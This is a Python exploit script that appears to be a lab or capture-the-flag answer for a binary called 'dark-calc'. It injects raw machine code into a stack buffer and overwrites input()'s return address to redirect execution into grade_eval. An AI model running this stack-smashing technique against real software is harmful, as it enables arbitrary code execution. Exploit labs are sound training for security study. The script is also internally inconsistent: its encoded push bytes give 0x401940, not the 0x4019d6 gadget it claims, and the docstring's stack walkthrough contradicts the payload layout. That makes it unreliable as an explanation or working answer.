#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

dark-calc installs a *fixed*, executable stack with init_fixed_stack():
the mmap base is 0x721000000000 and fixed_stack_top is 0x721000801000.
For input() we therefore know the buffer address exactly:

    rbp_input   = 0x721000800fe0
    expression  = rbp_input - 0x10 = 0x721000800fd0

We put a small program at expression and overwrite input()'s return
address with expression's address.  Layout (expression+0 .. +39):

    +0   push 0x4019d6       ; a bare `ret` gadget
    +5   push 4
    +7   pop rdi             ; edi = 4
    +8   mov eax, 0x401a87   ; grade_eval
    +13  jmp rax             ; jump, *not* call
    +15  9 x nop
    +24  expression          ; input()'s return address
    +32  main                ; final return target

Because we jump instead of call, grade_eval()'s `leave; ret` pops the
0x4019d6 pushed at expression+24; that `ret` then pops main from
expression+32.  main() sees EOF on stdin and exits cleanly.  The whole
payload stays below the guard page at expression+48.
"""
import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


BUFFER = 0x721000800FD0
GRADE_EVAL = 0x401A87
MAIN = 0x401AC3
RET = 0x4019D6

code = bytes.fromhex(
    "6840194000"                    # push 0x4019d6 (ret)
    "6a04"                          # push 4
    "5f"                            # pop rdi
    "b8871a4000"                    # mov eax, 0x401a87 (grade_eval)
    "ffe0"                          # jmp rax
)
assert len(code) == 15

payload = code.ljust(24, b"\x90")   # fill the 16-byte buffer + saved rbp
payload += p64(BUFFER)              # input()'s return address
payload += p64(MAIN)                # popped by the final ret gadget
payload += b"\n"

sys.stdout.buffer.write(payload)
